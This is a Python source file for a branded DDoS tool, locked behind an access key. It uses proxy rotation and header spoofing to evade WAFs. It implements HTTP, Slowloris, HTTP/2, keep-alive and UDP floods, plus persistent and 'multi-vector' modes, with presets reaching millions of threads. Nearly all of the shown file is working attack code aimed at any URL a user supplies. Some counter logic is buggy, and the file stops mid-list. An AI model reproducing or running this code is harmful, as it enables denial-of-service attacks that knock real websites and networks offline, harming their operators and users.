#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
from colorama import init, Fore, Back, Style
import socket
import ssl
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import asyncio

# Attempt to import h2 for HTTP/2 support
try:
    import h2.connection
    import h2.config
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[!] **_HTTP/2 module 'h2' not found. HTTP/2 attacks disabled. Install with 'pip install h2'_**{Fore.RESET}")

# Initialize colorama
init()

# Fallback ANSI codes
try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class Fore:
        CYAN = '\033[96m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

    class Back:
        BLACK = '\033[40m'
        BLUE = '\033[44m'
        CYAN = '\033[46m'
        RED = '\033[41m'
        MAGENTA = '\033[45m'
        RESET = '\033[0m'

    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# File integrity check
EXPECTED_HASH = None

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Generated new file hash: {file_hash}_**{Fore.RESET}")
            elif file_hash != EXPECTED_HASH:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_File integrity compromised! Exiting._**{Fore.RESET}")
                exit(1)
    except Exception as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_File integrity check failed: {str(e)}_**{Fore.RESET}")
        exit(1)

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Display animated header
def display_header():
    clear_screen()
    colors = [Fore.RED, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.GREEN]
    title = "✸ QUANG BAO DDOS - SIÊU VIP 2025 ✸"
    subtitle = "Powered by Ultimate Cyber Framework"
    for i in range(5):
        clear_screen()
        color = colors[i % len(colors)]
        print(f"{Back.BLACK}{color}{Style.BRIGHT}")
        print("╔══════════════════════════════════════╗")
        print(f"║{title.center(38)}║")
        print(f"║{subtitle.center(38)}║")
        print("╚══════════════════════════════════════╝")
        print(f"{Style.RESET_ALL}{Fore.RESET}")
        time.sleep(0.3)
    time.sleep(1)

# Target selection effect
def target_selection_effect(target_type):
    frames = [
        f"[✓] **_Locking target: {target_type.upper()} [20%]..._**",
        f"[✓] **_Locking target: {target_type.upper()} [50%]..._**",
        f"[✓] **_Locking target: {target_type.upper()} [80%]..._**",
        f"[✓] **_Target locked: {target_type.upper()} [100%]!_**"
    ]
    for frame in frames:
        clear_screen()
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.CYAN}{Style.BRIGHT}{frame}{Style.RESET_ALL}{Fore.RESET}")
        time.sleep(0.3)

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Random headers for WAF bypass
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
    }

# Proxy fetching and management
PROXY_LIST = []
PROXY_APIS = [
    "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=socks5"
]

async def fetch_proxies():
    global PROXY_LIST
    async with aiohttp.ClientSession() as session:
        for api in PROXY_APIS:
            try:
                async with session.get(api, timeout=10) as response:
                    if response.status == 200:
                        proxies = await response.text()
                        for line in proxies.splitlines():
                            proxy = line.strip()
                            if proxy:
                                if api.endswith("socks4"):
                                    PROXY_LIST.append({"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"})
                                elif api.endswith("socks5"):
                                    PROXY_LIST.append({"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"})
                                else:
                                    PROXY_LIST.append({"http": f"http://{proxy}", "https": f"https://{proxy}"})
            except Exception as e:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Failed to fetch proxies from {api}: {str(e)}_**{Fore.RESET}")
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Fetched {len(PROXY_LIST)} proxies_**{Fore.RESET}")

def get_user_proxies():
    global PROXY_LIST
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.MAGENTA}{Style.BRIGHT}➤ **_Enter custom proxies (format: http://ip:port or socks5://ip:port, one per line, or leave blank to fetch automatically):_** {Fore.WHITE}{Style.RESET_ALL}")
    proxies_input = []
    while True:
        line = input().strip()
        if not line:
            break
        proxies_input.append(line)
    for proxy in proxies_input:
        if proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            PROXY_LIST.append({"http": proxy, "https": proxy})
        else:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Invalid proxy format: {proxy}_**{Fore.RESET}")
    return len(proxies_input) == 0  # Return True if no proxies were input, indicating need to fetch

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Random POST data
POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
}

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("Invalid URL")
        return url
    except Exception as e:
        raise ValueError(f"Invalid URL: {e}")

# Save attack configuration for persistent mode
def save_attack_config(url, num_threads, requests_per_thread, target_type):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Persistent attack config saved: {url}_**{Fore.RESET}")
    except Exception as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Failed to save attack config: {str(e)}_**{Fore.RESET}")

# Optimized persistent attack process
async def persistent_attack_process(url, session):
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)  # Doubled payload size
            start_time = time.perf_counter()
            if method == "GET":
                async with session.get(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                    status = response.status
            elif method == "POST":
                async with session.post(url, data=payload, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                    status = response.status
            else:
                async with session.head(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                    status = response.status
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            with manager:
                success_count += 1
                response_times.append(response_time)
            if status in (429, 403, 522):
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_Persistent attack: Status {status} - TARGET OVERLOADED_**{Fore.RESET}")
            else:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Persistent attack: Status {status}_**{Fore.RESET}")
        except aiohttp.ClientError as e:
            with manager:
                error_count += 1
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Persistent attack failed: {str(e)}_**{Fore.RESET}")
        await asyncio.sleep(random.uniform(0.000025, 0.00005))  # Halved delay

# HTTP/2 Multiplexing attack
async def http2_multiplexing_attack(url, session):
    if not HTTP2_AVAILABLE:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_HTTP/2 attack disabled: 'h2' module not installed_**{Fore.RESET}")
        return
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 443
    try:
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        headers = {
            ':method': 'GET',
            ':path': '/',
            ':scheme': 'https',
            ':authority': host,
            'user-agent': random.choice(USER_AGENTS),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
        }
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, proxy=get_random_proxy().get('http') if get_random_proxy() else None) as response:
                if response.status in (429, 403, 522):
                    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_HTTP/2 attack: Status {response.status} - TARGET OVERLOADED_**{Fore.RESET}")
                else:
                    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_HTTP/2 attack: Status {response.status}_**{Fore.RESET}")
    except Exception as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_HTTP/2 attack failed: {str(e)}_**{Fore.RESET}")

# Optimized Keep-Alive + Pipelining attack
async def keep_alive_pipelining_attack(url, session):
    headers = generate_random_headers()
    headers['Connection'] = 'keep-alive'
    headers['Keep-Alive'] = 'timeout=5, max=1000'
    proxy = get_random_proxy()
    try:
        async with session.get(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
            if response.status in (429, 403, 522):
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_Keep-Alive attack: Status {response.status} - TARGET OVERLOADED_**{Fore.RESET}")
            else:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Keep-Alive attack: Status {response.status}_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Keep-Alive attack failed: {str(e)}_**{Fore.RESET}")

# Optimized Multiprocessing attack
async def multiprocessing_attack(url, session):
    methods = ["GET", "POST", "HEAD"]
    try:
        method = random.choice(methods)
        headers = generate_random_headers()
        proxy = get_random_proxy()
        payload = "X" * random.randint(102400, 204800)  # Doubled payload size
        start_time = time.perf_counter()
        if method == "GET":
            async with session.get(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        elif method == "POST":
            async with session.post(url, data=payload, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        else:
            async with session.head(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        end_time = time.perf_counter()
        response_time = (end_time - start_time) * 1000
        with manager:
            success_count += 1
            response_times.append(response_time)
        if status in (429, 403, 522):
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_Multiprocessing attack: Status {status} - TARGET OVERLOADED_**{Fore.RESET}")
        else:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Multiprocessing attack: Status {status}_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        with manager:
            error_count += 1
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Multiprocessing attack failed: {str(e)}_**{Fore.RESET}")

# Multiprocessing + Async wrapper
async def multiprocessing_async_attack(url):
    async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
        tasks = [multiprocessing_attack(url, session) for _ in range(20)]  # Doubled tasks
        await asyncio.gather(*tasks)

def multiprocessing_async_wrapper(url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(multiprocessing_async_attack(url))

# Layer 4 UDP Flood
def udp_flood_attack(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            payload = os.urandom(random.randint(128, 2800))  # Doubled payload size range
            sock.sendto(payload, (host, port))
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_UDP Flood: Packet sent to {host}:{port}_**{Fore.RESET}")
            time.sleep(0.000025)  # Halved delay
    except Exception as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_UDP Flood failed: {str(e)}_**{Fore.RESET}")
    finally:
        sock.close()

# Optimized Layer 7 WAF Bypass attack
async def layer7_waf_bypass_attack(url, session):
    methods = ["GET", "POST", "HEAD"]
    try:
        method = random.choice(methods)
        headers = generate_random_headers()
        proxy = get_random_proxy()
        payload = "X" * random.randint(102400, 204800)  # Doubled payload size
        if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
            await http2_multiplexing_attack(url, session)
        else:
            headers['Connection'] = 'keep-alive'
            headers['Keep-Alive'] = 'timeout=5, max=1000'
            start_time = time.perf_counter()
            if method == "GET":
                async with session.get(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                    status = response.status
            elif method == "POST":
                async with session.post(url, data=payload, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                    status = response.status
            else:
                async with session.head(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                    status = response.status
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            with manager:
                success_count += 1
                response_times.append(response_time)
            if status in (429, 403, 522):
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_WAF Bypass: Status {status} - TARGET OVERLOADED_**{Fore.RESET}")
            else:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_WAF Bypass: Status {status}_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        with manager:
            error_count += 1
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_WAF Bypass failed: {str(e)}_**{Fore.RESET}")

# Optimized Slowloris attack
async def slowloris_attack(url, session, duration=60):  # Doubled duration
    sockets = []
    try:
        for _ in range(1000):  # Doubled connections
            headers = generate_random_headers()
            headers['Connection'] = 'keep-alive'
            proxy = get_random_proxy()
            async with session.get(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=30, ssl=False) as response:
                sockets.append(response)
            await asyncio.sleep(0.0025)  # Halved delay
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Slowloris: Connections established_**{Fore.RESET}")
        await asyncio.sleep(duration)
    except aiohttp.ClientError as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Slowloris failed: {str(e)}_**{Fore.RESET}")
    finally:
        for sock in sockets:
            await sock.close()

# Optimized HTTP Flood attack
async def http_flood_attack(url, session, request_count):
    try:
        headers = generate_random_headers()
        proxy = get_random_proxy()
        payload = "A" * 102400  # Doubled payload size
        async with session.post(url, data=payload, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_HTTP Flood: Status {response.status}_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_HTTP Flood failed: {str(e)}_**{Fore.RESET}")

# Optimized Unlimited threads attack
async def unlimited_threads_attack(url, session):
    try:
        headers = generate_random_headers()
        proxy = get_random_proxy()
        payload = "A" * 102400  # Doubled payload size
        async with session.post(url, data=payload, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_Unlimited: Status {response.status}_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Unlimited attack failed: {str(e)}_**{Fore.RESET}")

# Optimized 429/403 Overload attack
async def overload_429_403_attack(url, session, request_count):
    methods = ["GET", "POST", "HEAD"]
    try:
        method = random.choice(methods)
        headers = generate_random_headers()
        proxy = get_random_proxy()
        start_time = time.perf_counter()
        if method == "GET":
            async with session.get(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        elif method == "POST":
            async with session.post(url, data=POST_DATA, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        else:
            async with session.head(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        end_time = time.perf_counter()
        response_time = (end_time - start_time) * 1000
        with manager:
            success_count += 1
            response_times.append(response_time)
        if status in (429, 403):
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_429/403 Overload: Status {status} - TARGET OVERLOADED_**{Fore.RESET}")
        else:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_429/403 Overload: Status {status}_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        with manager:
            error_count += 1
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_429/403 Overload failed: {str(e)}_**{Fore.RESET}")

# Optimized 522 Blitz attack
async def blitz_522_attack(url, session, request_count):
    try:
        headers = generate_random_headers()
        proxy = get_random_proxy()
        payload = "X" * 204800  # Doubled payload size
        async with session.post(url, data=payload, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=0.5) as response:
            if response.status == 522:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_Blitz 522: Status 522 - TARGET CONNECTION DROPPED_**{Fore.RESET}")
            else:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Blitz 522: Status {response.status}_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Blitz 522 failed: {str(e)}_**{Fore.RESET}")

# Optimized Combined attack
async def combined_all_attack(url, session, request_count):
    attack_types = ["slowloris", "flood", "429403", "522", "http2", "keep_alive"]
    attack_type = random.choice(attack_types)
    if attack_type == "slowloris":
        await slowloris_attack(url, session, 60)  # Doubled duration
    elif attack_type == "flood":
        await http_flood_attack(url, session, request_count)
    elif attack_type == "429403":
        await overload_429_403_attack(url, session, request_count)
    elif attack_type == "522":
        await blitz_522_attack(url, session, request_count)
    elif attack_type == "http2" and HTTP2_AVAILABLE:
        await http2_multiplexing_attack(url, session)
    else:
        await keep_alive_pipelining_attack(url, session)

# Optimized Multi-vector attack
async def multi_vector_attack(url, session, request_count):
    attack_types = ["slowloris", "flood", "429403", "522", "http2", "keep_alive", "udp_flood"]
    attack_type = random.choice(attack_types)
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 80
    if attack_type == "slowloris":
        await slowloris_attack(url, session, 60)  # Doubled duration
    elif attack_type == "flood":
        await http_flood_attack(url, session, request_count)
    elif attack_type == "429403":
        await overload_429_403_attack(url, session, request_count)
    elif attack_type == "522":
        await blitz_522_attack(url, session, request_count)
    elif attack_type == "http2" and HTTP2_AVAILABLE:
        await http2_multiplexing_attack(url, session)
    elif attack_type == "keep_alive":
        await keep_alive_pipelining_attack(url, session)
    elif attack_type == "udp_flood":
        threading.Thread(target=udp_flood_attack, args=(host, port)).start()

# Optimized Layer 7 attack
async def layer7_attack(url, session, request_count):
    if random.choice([True, False]):
        await layer7_waf_bypass_attack(url, session)
    else:
        if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
            await http2_multiplexing_attack(url, session)
        else:
            await keep_alive_pipelining_attack(url, session)

# Optimized Send request
async def send_request(url, session, request_count):
    global success_count, error_count, response_times
    methods = ["GET", "POST", "HEAD"]
    try:
        method = random.choice(methods)
        headers = generate_random_headers()
        proxy = get_random_proxy()
        start_time = time.perf_counter()
        if method == "GET":
            async with session.get(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        elif method == "POST":
            async with session.post(url, data=POST_DATA, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        else:
            async with session.head(url, headers=headers, proxy=proxy.get('http') if proxy else None, timeout=1) as response:
                status = response.status
        end_time = time.perf_counter()
        response_time = (end_time - start_time) * 1000
        with manager:
            success_count += 1
            response_times.append(response_time)
        if status in (503, 429, 522):
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_{method} Attack: Status {status} | Time: {response_time:.2f}ms | Target: OVERLOADED_**{Fore.RESET}")
        else:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_{method} Attack: Status {status} | Time: {response_time:.2f}ms | Target: UNDER PRESSURE_**{Fore.RESET}")
    except aiohttp.ClientError as e:
        with manager:
            error_count += 1
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_Attack failed: {str(e)}_**{Fore.RESET}")

# Loading animation
def loading_animation(text="Preparing attack deployment", duration=3):
    print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[✓] **_{text}..._**{Style.RESET_ALL}{Fore.RESET}")
    for _ in range(3):
        print(f"{Fore.YELLOW}█{Fore.RESET}", end="", flush=True)
        time.sleep(duration / 3)
    print(f"\n┌──(quangbao㉿attack)-[~]\n└─$ {Fore.GREEN}{Style.BRIGHT}[✓] **_{text} - Complete!_**{Style.RESET_ALL}{Fore.RESET}")

# Enhanced key generation with HMAC
def generate_key_hash(key):
    secret = "QUANGBAO2025ULTIMATE"
    return hashlib.sha512((secret + key).encode()).hexdigest()

# Enhanced key validation
def validate_key():
    VALID_KEY = "baoddos"
    VALID_KEY_HASH = generate_key_hash(VALID_KEY)
    attempts = 0
    max_attempts = 3

    while attempts < max_attempts:
        clear_screen()
        print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.MAGENTA}{Style.BRIGHT}➤ **_Enter access key:_** {Fore.WHITE}{Style.RESET_ALL}", end="")
        user_key = input().strip()
        loading_animation("Verifying credentials", 2)

        if generate_key_hash(user_key) == VALID_KEY_HASH:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.GREEN}{Style.BRIGHT}[✓] **_Access granted! System activated._**{Style.RESET_ALL}{Fore.RESET}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[!] **_Invalid key! {remaining} attempts remaining._**{Style.RESET_ALL}{Fore.RESET}")
            if remaining == 0:
                print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}{Style.BRIGHT}[!] **_Access locked!_**{Style.RESET_ALL}{Fore.RESET}")
                return False
            time.sleep(1)

# Enhanced website security assessment
async def assess_target_security(url):
    async with aiohttp.ClientSession() as session:
        error_message = None
        response_times = []
        status_codes = []
        for _ in range(5):
            start_time = time.perf_counter()
            try:
                async with session.get(url, headers=generate_random_headers(), proxy=get_random_proxy().get('http') if get_random_proxy() else None, timeout=3) as response:
                    end_time = time.perf_counter()
                    response_times.append((end_time - start_time) * 1000)
                    status_codes.append(response.status)
            except aiohttp.ClientError as e:
                error_message = f"Connection error: {str(e)}"
                break
            await asyncio.sleep(0.025)  # Halved delay

        if error_message:
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[!] **_{error_message}_**{Fore.RESET}")
            return "HIGH", 4000, 2000  # Doubled values

        avg_response_time = sum(response_times) / len(response_times) if response_times else 1000
        error_rate = status_codes.count(500) / len(status_codes) if status_codes else 0

        security_score = 0
        if avg_response_time < 500:
            security_score += 30
        if error_rate < 0.05:
            security_score += 20

        if security_score < 50:
            security_level = "LOW"
            recommended_threads = 1000  # Doubled
            recommended_requests = 400  # Doubled
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.GREEN}[✓] **_Target: Low security - Easily exploitable_**{Fore.RESET}")
        elif security_score < 80:
            security_level = "MEDIUM"
            recommended_threads = 2000  # Doubled
            recommended_requests = 1000  # Doubled
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.YELLOW}[✓] **_Target: Medium security - Moderate force required_**{Fore.RESET}")
        else:
            security_level = "HIGH"
            recommended_threads = 4000  # Doubled
            recommended_requests = 2000  # Doubled
            print(f"┌──(quangbao㉿attack)-[~]\n└─$ {Fore.RED}[✓] **_Target: High security - Maximum force required_**{Fore.RESET}")

        return security_level, recommended_threads, recommended_requests

# Target configurations with doubled threads and requests
TARGET_CONFIGS = [
    {"id": "1", "name": "small", "threads": 2000, "requests": 1000, "desc": "Lightweight attack with 1M hits", "level": "Low", "application": "Basic stress test"},
    {"id": "2", "name": "large", "threads": 4000, "requests": 2000, "desc": "Large-scale attack with 4M hits", "level": "Low-Medium", "application": "Medium-security targets"},
    {"id": "3", "name": "mega", "threads": 10000, "requests": 2000, "desc": "Powerful attack with 10K threads", "level": "Medium", "application": "Medium-traffic targets"},
    {"id": "4", "name": "ultra", "threads": 20000, "requests": 2000, "desc": "Ultra attack with 20K threads", "level": "Medium-High", "application": "Well-protected targets"},
    {"id": "5", "name": "infinite", "threads": 4000, "requests": 2000, "desc": "Infinite loop attack", "level": "Medium-High", "application": "Persistent attack"},
    {"id": "6", "name": "unlimited", "threads": 20000, "requests": 2000, "desc": "Unlimited thread attack", "level": "Medium-High", "application": "Persistent attack"},
    {"id": "7", "name": "overload429403", "threads": 30000, "requests": 4000, "desc": "Overload attack targeting 429/403 codes", "level": "High", "application": "Rate-limited systems"},
    {"id": "8", "name": "blitz522", "threads": 40000, "requests": 6000, "desc": "Blitz attack targeting 522 codes", "level": "High", "application": "Connection disruption"},
    {"id": "9", "name": "layer3_4", "threads": 40000, "requests": 10000, "desc": "Layer 3/4 UDP attack", "level": "High", "application": "Network disruption"},
    {"id": "10", "name": "combined", "threads": 50000, "requests": 8000, "desc": "Combined attack with all techniques", "level": "High", "application": "Complex targets"},
    {"id": "11", "name": "layer7", "threads": 50000, "requests": 8000, "desc": "Layer 7 attack targeting web applications", "level": "High", "application": "Web application overload"},
    {"id": "12", "name": "multi_vector", "threads": 60000, "requests": 12000, "desc": "Multi-vector attack combining all techniques", "level": "Very High", "application": "Large-scale targets"},
    {"id": "13", "name": "god", "threads": 60000, "requests": 2000, "desc": "God-level attack with 60K threads", "level": "Very High", "application": "High-security targets"},
    {"id": "14", "name": "hyper", "threads": 2000000, "requests": 2000, "desc": "Hyper-speed attack with 2M threads", "level": "Extreme", "application": "Large systems"},
    {"id": "15", "name": "supra", "threads": 4000000, "requests": 2000, "desc": "Supreme attack with 4M threads", "level": "Extreme", "application": "Massive targets"},
    {"id": "16", "name": "pulsar", "threads": 6000000, "requests": 2000, "desc": "Pulsar attack with 6M threads", "level": "Extreme", "application": "Distributed systems"},
    {"id": "17", "name": "quasar", "threads": 7000000, "requests": 2000, "desc": "Quasar attack with 7M threads", "level": "Extreme", "application": "CDN systems"},
    {"id": "18", "name": "prime", "threads": 10000000, "requests": 2000, "desc": "Prime attack with 10M threads", "level": "Extreme", "application": "High-load systems"},
    {"id": "19", "name": "cosmic", "threads": 12000000, "requests": 2000, "desc": "Cosmic attack with 12M threads", "level": "Extreme", "application": "Large-scale systems"},
    {"id": "20", "name": "ultima", "threads": 20000000, "requests": 2000, "desc": "Ultimate attack with 20M threads", "level": "Extreme", "application": "Enterprise systems"},
    {"id": "21", "name": "nova", "threads": 20000000, "requests": 2000, "desc": "Supernova attack with 20M threads", "level": "Extreme", "application": "Extreme-load systems"},
